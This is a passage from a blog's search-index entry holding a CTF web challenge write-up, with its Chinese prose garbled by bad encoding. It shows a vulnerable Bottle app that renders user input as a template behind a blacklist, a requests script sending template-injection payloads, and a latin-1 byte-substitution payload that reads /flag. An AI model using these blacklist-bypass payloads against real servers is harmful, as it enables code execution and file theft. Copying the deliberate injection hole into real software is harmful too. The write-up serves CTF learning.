class="hljs-string">&quot;payload&quot;</span>: <span class="hljs-string">&quot;\n%import os;eval(os.a)&quot;</span>&#125;)<br>r = requests.get(url, params=&#123;<span class="hljs-string">&quot;payload&quot;</span>: <span class="hljs-string">&quot;\n%include(&#x27;hah&#x27;)&quot;</span>&#125;).text<br><br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure><h2 id="å‡ºé¢˜äººåˆç–¯"><a href="#å‡ºé¢˜äººåˆç–¯" class="headerlink" title="å‡ºé¢˜äººåˆç–¯"></a>å‡ºé¢˜äººåˆç–¯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2025/03/29 15:52:17</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> bottle<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br>blacklist = [<br>    <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span> , <span class="hljs-string">&#x27;read&#x27;</span><br>]<br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/attack&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    payload = bottle.request.query.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">all</span>(c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist):<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">return</span> bottle.template(<span class="hljs-string">&#x27;hello &#x27;</span>+payload)<br>    <span class="hljs-keyword">else</span>:<br>        bottle.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid payload&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>è¾ƒä¸Šä¸€é¢˜ï¼Œå°†readåŠå…¶ä¸€äº›å…¶ä»–å­—ç¬¦ç¦ç”¨</p><p>ç»§ç»­åˆ©ç”¨latin-1ç»•è¿‡</p><p>å°†oæ›¿æ¢æˆ%baï¼Œå°†aæ›¿æ¢æˆ%aa</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payloadï¼š/attack?payload=</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">bapen</span>(<span class="hljs-name">&#x27;/flag&#x27;</span>).re%aad()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/xyctf2025-web%E5%A4%8D%E7%8E%B0/crazy_again.png"></p><p>å‚è€ƒåšå®¢ï¼š</p><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18730353">https://www.cnblogs.com/LAMENTXU/articles/18730353</a></p><p><a href="https://blog.csdn.net/oyf3085227433/article/details/147075769">https://blog.csdn.net/oyf3085227433/article/details/147075769</a></p><p><a href="https://www.cnblogs.com/ddd-flag/articles/18816057">https://www.cnblogs.com/ddd-flag/articles/18816057</a></p><p><a href="https://www.mcso.top/all/">https://www.mcso.top/all/</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
